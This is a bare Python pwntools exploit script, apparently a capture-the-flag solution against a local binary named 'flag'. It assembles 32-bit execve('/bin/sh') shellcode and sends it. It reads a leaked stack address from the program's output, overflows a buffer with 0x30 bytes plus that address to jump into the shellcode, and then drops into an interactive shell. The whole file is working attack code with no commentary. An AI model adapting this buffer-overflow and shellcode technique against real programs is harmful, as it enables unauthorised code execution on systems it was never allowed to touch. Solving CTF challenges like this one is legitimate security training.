from pwn import *
#context.log_level = "debug"

r = process("flag")
r.recvuntil(":")
#attach(r)
shell_code=asm("xor edx,edx")+asm("xor ecx,ecx")+asm("mov al,0xb")+"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
r.send(shell_code+"a"*(200-len(shell_code)))
r.recvuntil("stored in ")
addr_str = r.recvuntil("what")[:-4]
addr = int(addr_str,16)
print hex(addr)
r.recv()
r.send("a"*0x30+p32(addr))
r.interactive()
